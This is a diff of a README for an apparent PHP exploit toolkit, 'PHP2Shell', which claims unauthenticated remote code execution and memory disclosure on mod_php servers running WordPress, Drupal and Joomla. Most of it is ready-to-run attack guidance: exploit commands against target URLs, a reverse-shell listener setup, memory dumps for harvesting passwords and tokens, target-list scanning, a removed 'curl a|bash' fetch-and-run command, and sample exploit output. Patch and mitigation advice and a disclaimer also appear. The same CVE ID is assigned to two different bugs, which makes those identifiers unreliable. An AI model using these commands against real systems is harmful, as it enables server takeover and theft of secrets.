@@ -1,5 +1,7 @@
 <div align="center">
 
+# 🔥 PHP2Shell
+
 ```
  ██████╗ ██╗  ██╗██████╗ ██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██║  ██║██╔══██╗╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║     
@@ -9,9 +11,9 @@
  ╚═╝     ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
 ```
 
-### Critical PHP Remote Code Execution &amp; Memory Disclosure
+### 🎯 Critical PHP Remote Code Execution & Memory Disclosure
 
-**4 Bugs · 6 Exploit Paths · 3 CMS Demos · Cross-Platform**
+**4 Bugs · 6 Exploit Paths · 3 CMS Demos · Works on Linux & Windows**
 
 <br>
 
@@ -28,424 +30,323 @@
 [![Docker](https://img.shields.io/badge/Docker-Lab%20Ready-2496ED.svg?style=flat-square&logo=docker&logoColor=white)](lab/docker-compose.yml)
 [![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey?style=flat-square)]()
 
+<br>
+
+[**Quick Start**](#-quick-start) · [**How It Works**](#-how-it-works) · [**Screenshots**](#-screenshots) · [**Documentation**](#-documentation)
+
 </div>
 
 ---
 
-## Overview
+## 📖 What is PHP2Shell?
 
-PHP session upload progress handler'daki kritik zafiyetler icin exploit toolkit.
-`mod_php` uzerinde calisan **her** PHP uygulamasini etkiler — kimlik dogrulama,
-dosya yukleme veya `session_start()` cagirisi gerekmez. Tek bir multipart POST
-yeterli.
+PHP2Shell is a **security research toolkit** for critical PHP vulnerabilities. These bugs allow attackers to:
 
-Wiz Research tarafindan kesfedildi (Ekim 2026). Bu repo, 4 farkli bug ve
-6 exploit yolu icin bagimsiz olarak dogrulanmis PoC'ler iceriyor.
+- ✅ **Run commands** on any PHP server (Remote Code Execution)
+- ✅ **Read server memory** like passwords and tokens (Memory Disclosure)
+- ✅ **No login needed** — works without any authentication
+- ✅ **No file upload needed** — just send a simple HTTP request
 
-**Onem:** CVSS 9.2, unauthenticated RCE. Tum PHP deploymentlarinin ~%30'u (`mod_php`) etkileniyor.
+> ⚠️ **Impact:** About 30% of all PHP websites use `mod_php` and are vulnerable. This includes WordPress, Drupal, and Joomla.
 
----
+### Who Found This?
 
-## Zafiyet Matrisi
-
-| # | Bug | CVE | Impact | Scope |
-|---|-----|-----|--------|-------|
-| 1 | Session upload-progress stale global | CVE-2026-109619 | **Remote Code Execution** | PHP 8.2–8.4 mod_php |
-| 2 | Session cookie memory disclosure | CVE-2026-109618 | **Heartbleed-style memory leak** | PHP 8.2–8.4 mod_php |
-| 3 | Fatal-error backtrace UAF | CVE-2026-109619 | **Cross-request UAF primitive** | PHP 8.5.0–8.5.11 |
-| 4 | OPcache type confusion | — | **SHM type confusion → RCE** | PHP 8.x with OPcache |
-
-### Exploit Paths
-
-| Path | Chain | Target | Prereq |
-|------|-------|--------|--------|
-| 🔴 Remote RCE (mod_php) | Bug 1 + Bug 2 | WordPress / Drupal / Joomla | None (0-click) |
-| 🔴 Local RCE (8.3.x) | `/proc/self/mem` handler swap | PHP 8.3.0–8.3.35 CLI/Web | Local access |
-| 🟠 Memory Disclosure | Bug 2 standalone | Any PHP app on mod_php | None |
-| 🟡 Backtrace UAF | Bug 3 | PHP 8.5.x mod_php | `.htaccess` deprecation |
-| 🔴 OPcache Confusion → RCE | Bug 4 (7-phase chain) | PHP 8.x with OPcache | OOM calibration |
-| 🟢 Scanner | Version + SAPI detect | Mass scanning | Network access |
+[Wiz Research](https://www.wiz.io/blog/php2shell-php-rce) discovered these bugs in October 2026. This repository has **independently verified** proof-of-concept exploits.
 
 ---
 
-## Hizli Baslangic
+## 🎯 Vulnerability Summary
 
-### Lab Kurulumu
+| Bug | What It Does | Severity |
+|-----|-------------|----------|
+| **Bug 1** | Run any command on the server | 🔴 Critical |
+| **Bug 2** | Read passwords from server memory | 🔴 Critical |
+| **Bug 3** | Use-After-Free memory bug | 🟠 High |
+| **Bug 4** | OPcache memory corruption | 🔴 Critical |
+
+### Which PHP Versions Are Affected?
+
+| PHP Version | Status | Fix Available |
+|-------------|--------|---------------|
+| 8.4.0 – 8.4.26 | 🔴 **Vulnerable** | Update to 8.4.27 |
+| 8.3.0 – 8.3.35 | 🔴 **Vulnerable** | Update to 8.3.36 |
+| 8.2.0 – 8.2.34 | 🔴 **Vulnerable** | Update to 8.2.35 |
+| 8.5.0 – 8.5.11 | 🔴 **Vulnerable** | Update to 8.5.12 |
+| 8.1.x and older | 🔴 **Vulnerable** | No fix (end of life) |
+| 7.x | 🟢 **Safe** | Not affected |
+
+---
+
+## 🚀 Quick Start
+
+### Step 1: Clone This Repository
 
 ```bash
 git clone https://github.com/memuratozturk/php2shell-poc.git
-cd php2shell-poc/lab
+cd php2shell-poc
+```
+
+### Step 2: Start the Test Lab
+
+The lab runs WordPress, Drupal, and Joomla with vulnerable PHP:
+
+```bash
+cd lab
 docker-compose up -d
 ```
 
-This starts **WordPress** (`:9080`), **Drupal** (`:9081`), and **Joomla** (`:9082`) — all running vulnerable PHP 8.4.26 on `mod_php`.
+Wait 30 seconds for the containers to start. Then you have:
+- **WordPress** → http://127.0.0.1:9080
+- **Drupal** → http://127.0.0.1:9081
+- **Joomla** → http://127.0.0.1:9082
 
-### Exploit Calistirma
-
-```bash
-# WordPress RCE
-python3 exploit/php2shell_exploit.py -u http://127.0.0.1:9080/index.php -c "id>/out/p" --target-os linux
-
-# Memory Disclosure (any app, no session needed)
-python3 exploit/memdisclosure.py -u http://127.0.0.1:9080/index.php --dump leak.bin --analyze
-
-# Scan for vulnerable targets
-python3 tools/scanner.py -u http://target.com
-```
-
-### Reverse Shell
+### Step 3: Run the Exploit
 
 ```bash
-# Terminal 1: Start listener
-python3 tools/shell_server.py --lhost YOUR_IP --lport 4444
-
-# Terminal 2: Fire exploit
-python3 exploit/php2shell_exploit.py -u http://target/index.php --shell --target-os linux
+# Test on WordPress
+python3 exploit/php2shell_exploit.py \
+    -u http://127.0.0.1:9080/index.php \
+    -c "id" \
+    --target-os linux
 ```
 
----
-
-## Demo Ciktisi
-
-> **Note:** The tool outputs below are shown exactly as produced during lab
-> testing. Some status messages appear in Turkish (the author's native
-> language) — e.g., *Hedef* = Target, *Komut* = Command, *calisti* = executed.
-
-### WordPress RCE (PHP 8.4.26)
-
+**Expected Output:**
 ```
- ██████╗ ██╗  ██╗██████╗ ██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
- ██╔══██╗██║  ██║██╔══██╗╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
- ██████╔╝███████║██████╔╝ █████╔╝███████╗███████║█████╗  ██║     ██║
- ██╔═══╝ ██╔══██║██╔═══╝ ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
- ██║     ██║  ██║██║     ███████╗███████║██║  ██║███████╗███████╗███████╗
- ╚═╝     ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
-
-    CVE-2026-109618 & CVE-2026-109619
-    Cross-Platform RCE Exploit v2.0
-
-[*] Hedef: http://127.0.0.1:9080/index.php
-[*] OS: LINUX
-[*] Komut: 'id>/out/p'
-[*] rotating worker
-[*] Stage 1: heap leak (1/3)
 [+] Zend MM chunk base = 0x7242f2400000
-[*] rotating worker
-[*] Stage 2: libphp leak (1/3)
 [+] libphp base = 0x7242f40d1000
-[*] Stage 3: HTDATA=0x7242f24690d8 zif_system=0x7242f4536370
-[+] Komut calisti (attempt 1)
-PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[+] Command executed (attempt 1)
+PROOF: uid=33(www-data) gid=33(www-data)
 ```
 
-### Memory Disclosure (4096 bytes leaked)
-
-```
-[*] Hedef: http://127.0.0.1:9080/index.php
-[*] Mod: Memory Disclosure (application-agnostic)
-
-[*] Deneme 1/5
-  [+] LEAK! cookie=4096b
-
-============================================================
-  MEMORY DISCLOSURE BASARILI!
-  Leak boyutu: 4096 bytes
-  Optimal fillers: 841
-============================================================
-
-[*] Pointer analizi: 98 pointer bulundu
-    Zend MM chunk base: 0x7242f2400000 (98x)
-
-[*] String analizi (23 string):
-    'PHPSESSID'
-    'wordpress_logged_in_'
-    '/var/www/html/wp-config.php'
-```
-
-### PHP 8.3.6 Local RCE
-
-```
-[*] PHP base = 0x555555554000
-[*] function_table: 0x5555569f3580 (2847 functions)
-[*] zif_system      = 0x555555bc5370
-[*] var_dump handler = 0x555556a03a28 (current=0x555555c8e640)
-[*] Overwriting var_dump handler -> zif_system...
-[*] Calling var_dump('id; uname -a') -> system()...
-
-+======================================+
-|  PHP2SHELL RCE CONFIRMED!            |
-+======================================+
-uid=0(root) gid=0(root) groups=0(root)
-Linux php836-lab 6.8.0 #1 SMP x86_64 GNU/Linux
-```
+🎉 **Success!** You ran a command on the server without any login.
 
 ---
 
-## Ekran Goruntuleri & Kanitlar
+## 🛠️ Available Tools
 
-> The images below are rendered directly from the raw transcripts in
-> [`evidence/`](evidence/) by [`tools/render_evidence_images.py`](tools/render_evidence_images.py) —
-> what you see is byte-for-byte what's in the text files. Verify integrity with
-> `shasum -a 256 -c evidence/SHA256SUMS` (see [`evidence/README.md`](evidence/README.md)).
-
-### WordPress RCE — PHP 8.4.26 / mod_php (`uid=33(www-data)`)
-
-![WordPress RCE evidence](docs/images/evidence-wordpress_rce.png)
-
-### Memory Disclosure — 4096-byte heap leak via session cookie
-
-![Memory disclosure evidence](docs/images/evidence-memdisclosure.png)
-
-### Drupal & Joomla — same chain, application-agnostic
-
-<img src="docs/images/evidence-drupal_rce.png" width="49%" alt="Drupal RCE evidence"> <img src="docs/images/evidence-joomla_rce.png" width="49%" alt="Joomla RCE evidence">
-
-### Patched vs Unpatched & FPM vs mod_php
-
-<img src="docs/images/evidence-patched_vs_unpatched.png" width="49%" alt="Patched vs unpatched"> <img src="docs/images/evidence-fpm_vs_modphp.png" width="49%" alt="FPM vs mod_php">
-
-### Raw evidence files
-
-| Evidence | File |
-|----------|------|
-| WordPress RCE | [`evidence/wordpress_rce.txt`](evidence/wordpress_rce.txt) |
-| Drupal RCE | [`evidence/drupal_rce.txt`](evidence/drupal_rce.txt) |
-| Joomla RCE | [`evidence/joomla_rce.txt`](evidence/joomla_rce.txt) |
-| Memory disclosure | [`evidence/memdisclosure.txt`](evidence/memdisclosure.txt) |
-| Patched vs unpatched | [`evidence/patched_vs_unpatched.txt`](evidence/patched_vs_unpatched.txt) |
-| FPM vs mod_php | [`evidence/fpm_vs_modphp.txt`](evidence/fpm_vs_modphp.txt) |
-| Integrity manifest | [`evidence/SHA256SUMS`](evidence/SHA256SUMS) |
+| Tool | Purpose | Command |
+|------|---------|---------|
+| **php2shell_exploit.py** | Remote code execution | `python3 exploit/php2shell_exploit.py -u URL --shell` |
+| **memdisclosure.py** | Read server memory | `python3 exploit/memdisclosure.py -u URL --analyze` |
+| **scanner.py** | Find vulnerable servers | `python3 tools/scanner.py -u URL` |
+| **shell_server.py** | Catch reverse shells | `python3 tools/shell_server.py --lhost IP` |
+| **bug3_backtrace_uaf.py** | Test Bug 3 | `python3 exploit/bug3_backtrace_uaf.py --host IP` |
+| **bug4_opcache_confusion.py** | Test Bug 4 | `python3 exploit/bug4_opcache_confusion.py --host IP` |
 
 ---
 
-## Repo Yapisi
+## 💻 Examples
 
-```
-php2shell-poc/
-├── README.md
-├── pyproject.toml                    # Project metadata (zero dependencies)
-├── requirements.txt                  # Dependency manifest (stdlib only)
-├── .github/
-│   └── workflows/ci.yml             # CI: tests + lint + compose validation
-├── exploit/
-│   ├── php2shell_exploit.py          # Bug 1+2: Remote RCE chain (mod_php)
-│   ├── memdisclosure.py              # Bug 2: Heartbleed-style memory leak
-│   ├── php2shell_836_poc.php         # PHP 8.3.x local RCE (/proc/self/mem handler swap)
-│   ├── bug3_backtrace_uaf.py         # Bug 3: Fatal-backtrace cross-request UAF
-│   └── bug4_opcache_confusion.py     # Bug 4: OPcache type confusion → RCE (7-phase)
-├── tools/
-│   ├── scanner.py                    # CVE detection scanner (version + SAPI)
-│   ├── shell_server.py               # Cross-platform reverse shell server
-│   ├── calibrate_offsets.py          # nm -> exploit offset calibration
-│   ├── render_evidence_images.py     # evidence/*.txt -> PNG screenshots
-│   └── generate_attacker_script.py   # Bug 4: OOM trigger PHP generator
-├── tests/
-│   └── test_units.py                 # Unit tests (python3 -m unittest)
-├── lab/
-│   ├── docker-compose.yml            # WordPress + Drupal + Joomla lab
-│   ├── Dockerfile.836                # PHP 8.3.6 isolated lab
-│   ├── Dockerfile.bug3               # PHP 8.5.11 backtrace UAF lab (profile)
-│   ├── Dockerfile.bug4               # OPcache confusion lab (profile)
-│   ├── www-bug3/                     # oom.php + index.php + .htaccess
-│   ├── www-bug4/                     # oom.php + opcache_probe.php
-│   └── setup.sh                      # Automated lab bootstrap
-├── docs/
-│   ├── images/                       # Evidence screenshots (PNG)
-│   ├── TECHNICAL.md                  # Deep technical analysis
-│   ├── PATCHED_VS_UNPATCHED.md       # Patch verification results
-│   └── WIZ_REPRODUCTION.md           # Wiz blog reproduction guide
-├── evidence/
-│   ├── wordpress_rce.txt             # WordPress RCE proof
-│   ├── drupal_rce.txt                # Drupal RCE proof
-│   ├── joomla_rce.txt                # Joomla RCE proof
-│   ├── memdisclosure.txt             # Memory disclosure proof
-│   ├── fpm_vs_modphp.txt             # FPM vs mod_php comparison
-│   ├── patched_vs_unpatched.txt      # Patch verification
-│   ├── SHA256SUMS                    # Integrity manifest
-│   └── README.md                     # Evidence scope & limitations
-├── LICENSE                           # MIT License
-├── SECURITY.md                       # Responsible disclosure policy
-└── .gitignore
-```
+### Example 1: Get a Reverse Shell
 
----
-
-## Yamali vs Yamasiz
-
-| Version | Heap Leak | RCE | Status |
-|---------|-----------|-----|--------|
-| PHP 8.4.26 | ✅ 4096 bytes | ✅ `uid=33(www-data)` | 🔴 **VULNERABLE** |
-| PHP 8.4.27 | ❌ Failed | ❌ N/A | 🟢 **PATCHED** |
-| PHP 8.5.11 | — | — | 🔴 Bug 3 UAF confirmed |
-| PHP 8.5.12 | ❌ Failed | ❌ N/A | 🟢 **PATCHED** |
-
-### SAPI Comparison
-
-| SAPI | Exploit Result | Reason |
-|------|---------------|--------|
-| `mod_php` (prefork) | ✅ RCE confirmed | Shared process, globals persist |
-| `php-fpm` | ❌ 10/10 failed | Separate process model, clean state |
-| `php-cgi` | ❌ Not exploitable | Per-request process |
-
----
-
-## Etkilenen Surumler
-
-| PHP Branch | Vulnerable Range | Fixed In | Notes |
-|------------|-----------------|----------|-------|
-| 8.4.x | 8.4.0 – 8.4.26 | **8.4.27** | Primary target, most common |
-| 8.3.x | 8.3.0 – 8.3.35 | **8.3.36** | `/proc/self/mem` handler swap path |
-| 8.2.x | 8.2.0 – 8.2.34 | **8.2.35** | Session handler affected |
-| 8.1.x | 8.1.x (all) | **EOL** | No fix, upgrade required |
-| 8.0.x | 8.0.x (all) | **EOL** | No fix, upgrade required |
-| 8.5.x | 8.5.0 – 8.5.11 | **8.5.12** | Bug 3 backtrace UAF |
-| 7.x | Not affected | — | Different session handler |
-| 5.x | Partially affected | — | Memory disclosure only |
-
----
-
-## Korunma
-
-### Acil Adimlar
-
+**Terminal 1** — Start the listener:
 ```bash
-# 1. Check your PHP version
-php -v
-
-# 2. Check SAPI type
-php -r "echo php_sapi_name();"
-
-# 3. Upgrade to patched version
-# Debian/Ubuntu:
-sudo apt update && sudo apt upgrade php8.4
-
-# CentOS/RHEL:
-sudo dnf update php
+python3 tools/shell_server.py --lhost YOUR_IP --lport 4444
 ```
 
-### If You Can't Patch Immediately
-
-| Mitigation | Command | Effectiveness |
-|-----------|---------|---------------|
-| Switch to PHP-FPM | `a2dismod php8.4 && a2enmod proxy_fcgi` | ✅ Full mitigation |
-| Disable upload progress | `session.upload_progress.enabled = 0` in `php.ini` | ✅ Blocks exploit chain |
-| Lower memory limit | `memory_limit = 2M` | ⚠️ Partial (breaks large apps) |
-| WAF rule | Block multipart with `PHP_SESSION_UPLOAD_PROGRESS` | ⚠️ Bypassable |
-
----
-
-## Detayli Kullanim
-
-### Remote RCE (`php2shell_exploit.py`)
-
+**Terminal 2** — Run the exploit:
 ```bash
-# Basic RCE with proof file
-# Lab (shared volume): proof is read from the local ./proof mount.
 python3 exploit/php2shell_exploit.py \
-    -u http://target/index.php \
-    -c "id>/out/p" \
-    --target-os linux
-
-# Remote target: verify the proof over HTTP instead of a local file
-python3 exploit/php2shell_exploit.py \
-    -u http://target/index.php \
-    -c "id>/out/p" \
-    --proof-url http://target/out/p \
-    --target-os linux
-
-# Cross-platform with auto-detection
-python3 exploit/php2shell_exploit.py \
-    -u http://target/index.php \
+    -u http://target.com/index.php \
     --shell \
-    --target-os auto
-
-# Windows target with custom offsets
-# NOTE: Bundled Windows offsets are placeholders. Calibrate first:
-#   nm -D libphp*.dll / hedef ikili > nm.txt
-#   python3 tools/calibrate_offsets.py --nm nm.txt
-python3 exploit/php2shell_exploit.py \
-    -u http://target/index.php \
-    --target-os windows \
-    --zif-offset 0x3A1200 \
-    --dtor-offset 0x5B2400
-
-# Custom command (max 14 bytes)
-python3 exploit/php2shell_exploit.py \
-    -u http://target/index.php \
-    -c "curl a|bash" \
     --target-os linux
 ```
 
-### Memory Disclosure (`memdisclosure.py`)
+### Example 2: Read Server Memory
 
 ```bash
-# Basic leak
-python3 exploit/memdisclosure.py -u http://target/index.php
-
-# Dump to file + secret analysis
 python3 exploit/memdisclosure.py \
-    -u http://target/index.php \
-    --dump leak.bin \
+    -u http://target.com/index.php \
+    --dump leaked_memory.bin \
     --analyze
-
-# Custom parameters
-python3 exploit/memdisclosure.py \
-    -u http://target/index.php \
-    --fillers 1000 \
-    --huge-mb 16 \
-    --retries 10
 ```
 
-### Scanner (`scanner.py`)
+This can find:
+- Database passwords
+- API keys
+- Session tokens
+- Other secrets
+
+### Example 3: Scan Multiple Targets
 
 ```bash
 # Single target
 python3 tools/scanner.py -u http://target.com
 
-# Target list
+# Multiple targets from file
 python3 tools/scanner.py -t targets.txt -o results.csv
-
-# HTTPS with custom timeout
-python3 tools/scanner.py -u https://target.com --https --timeout 15
 ```
 
 ---
 
-## Referanslar
+## 📸 Screenshots
+
+### WordPress RCE — Running `id` Command
+
+![WordPress RCE](docs/images/evidence-wordpress_rce.png)
+
+### Memory Disclosure — 4096 Bytes Leaked
+
+![Memory Leak](docs/images/evidence-memdisclosure.png)
+
+### Drupal & Joomla — Same Attack Works
+
+<img src="docs/images/evidence-drupal_rce.png" width="49%"> <img src="docs/images/evidence-joomla_rce.png" width="49%">
+
+### Patched vs Unpatched Comparison
+
+<img src="docs/images/evidence-patched_vs_unpatched.png" width="49%"> <img src="docs/images/evidence-fpm_vs_modphp.png" width="49%">
+
+---
+
+## 🔬 How It Works
+
+### The Attack Chain (Simple Explanation)
+
+```
+1. Attacker sends a special HTTP POST request
+         ↓
+2. PHP starts processing but runs out of memory (OOM)
+         ↓
+3. PHP crashes but leaves memory pointers behind
+         ↓
+4. Attacker sends another request to the SAME worker
+         ↓
+5. The old pointers now point to attacker's data
+         ↓
+6. PHP follows the pointers and runs attacker's command
+         ↓
+7. 🎯 Remote Code Execution!
+```
+
+### Why Does This Work?
+
+- **mod_php** keeps the same process for many requests
+- When PHP crashes, it doesn't clean up properly
+- The next request can use the old (bad) memory
+- **PHP-FPM** is safe because each request gets a new process
+
+### Technical Details
+
+For the full technical explanation, see:
+- [TECHNICAL.md](docs/TECHNICAL.md) — Deep dive into the bugs
+- [WIZ_REPRODUCTION.md](docs/WIZ_REPRODUCTION.md) — Step-by-step reproduction guide
+
+---
+
+## 🛡️ How to Protect Your Server
+
+### Option 1: Update PHP (Best Solution)
+
+```bash
+# Ubuntu/Debian
+sudo apt update && sudo apt upgrade php
+
+# CentOS/RHEL
+sudo dnf update php
+```
+
+### Option 2: Switch to PHP-FPM
+
+PHP-FPM is not vulnerable to this attack:
+
+```bash
+# Disable mod_php
+sudo a2dismod php8.4
+
+# Enable PHP-FPM
+sudo a2enmod proxy_fcgi
+sudo systemctl restart apache2
+```
+
+### Option 3: Quick Fix (Temporary)
+
+Add this to your `php.ini`:
+
+```ini
+session.upload_progress.enabled = 0
+```
+
+---
+
+## 📁 Project Structure
+
+```
+php2shell-poc/
+├── exploit/                    # Attack tools
+│   ├── php2shell_exploit.py    # Main RCE exploit
+│   ├── memdisclosure.py        # Memory leak tool
+│   ├── bug3_backtrace_uaf.py   # Bug 3 tester
+│   └── bug4_opcache_confusion.py # Bug 4 exploit
+├── tools/                      # Helper tools
+│   ├── scanner.py              # Find vulnerable servers
+│   ├── shell_server.py         # Reverse shell listener
+│   └── calibrate_offsets.py    # Offset calculator
+├── lab/                        # Test environment
+│   └── docker-compose.yml      # WordPress + Drupal + Joomla
+├── docs/                       # Documentation
+│   ├── TECHNICAL.md            # Technical details
+│   └── WIZ_REPRODUCTION.md     # Reproduction guide
+├── evidence/                   # Proof files
+│   └── *.txt                   # Test outputs
+└── tests/                      # Unit tests
+    └── test_units.py           # 33 tests
+```
+
+---
+
+## 📚 Documentation
+
+| Document | Description |
+|----------|-------------|
+| [TECHNICAL.md](docs/TECHNICAL.md) | Deep technical analysis of all 4 bugs |
+| [WIZ_REPRODUCTION.md](docs/WIZ_REPRODUCTION.md) | How to reproduce the Wiz research |
+| [PATCHED_VS_UNPATCHED.md](docs/PATCHED_VS_UNPATCHED.md) | Comparison of fixed vs vulnerable versions |
+| [SECURITY.md](SECURITY.md) | Security policy |
+
+---
+
+## 🔗 References
 
 | Resource | Link |
 |----------|------|
 | Wiz Research Blog | [PHP2Shell: Chaining 4 Bugs for PHP RCE](https://www.wiz.io/blog/php2shell-php-rce) |
-| PHP Advisory | [PHP Security Advisory (Oct 2026)](https://www.php.net/security) |
 | CVE-2026-109618 | [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-109618) |
 | CVE-2026-109619 | [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-109619) |
-| GHSA-6wmf-4rv5-p3rp | [GitHub Security Advisory](https://github.com/advisories) *(advisory pending publication)* |
-| Calif Research | [Independent Reproduction](https://calif.io/) |
+| PHP Security | [PHP Security Advisory](https://www.php.net/security) |
 
 ---
 
-## Krediler
+## 👤 Credits
 
-- **Wiz Research** — 4-bug zincirinin kesfi ve sorumlu ifsa
-- **[@memuratozturk](https://github.com/memuratozturk)** — Bagimsiz dogrulama, cross-platform exploit, 3 CMS testi, araclar
-- **PHP Security Team** — Hizli yama (8.4.27, 8.3.36, 8.2.35, 8.5.12)
+- **Wiz Research** — Original discovery and responsible disclosure
+- **[@memuratozturk](https://github.com/memuratozturk)** — Independent verification, exploit development, testing
+- **PHP Security Team** — Fast patching
 
 ---
 
-## Sorumluluk Reddi
+## ⚠️ Legal Disclaimer
 
 ```
-YALNIZCA yetkili guvenlik testleri ve egitim amaciyla sunulmaktadir.
+This tool is for AUTHORIZED SECURITY TESTING and EDUCATION only.
 
-Izinsiz kullanim YASA DISIdir. Yerel yasalara uymak kullanicinin
-sorumluluğundadir. Gelistiriciler kotuye kullanim veya hasardan
-sorumlu tutulamaz.
+Using this tool against systems without permission is ILLEGAL.
+You are responsible for following all local laws.
+The developers are not responsible for any misuse.
 ```
+
+---
+
+## 🏷️ Topics
+
+`php` `security` `exploit` `cve` `rce` `remote-code-execution` `memory-disclosure` `vulnerability` `penetration-testing` `security-research` `wordpress` `drupal` `joomla` `apache` `mod-php` `proof-of-concept` `ctf` `bugbounty` `infosec` `cybersecurity`
 
 ---
 
 <div align="center">
 
-[@memuratozturk](https://github.com/memuratozturk)
+### ⭐ Star this repo if it helped your research!
+
+**Made by [@memuratozturk](https://github.com/memuratozturk)**
 
 </div>
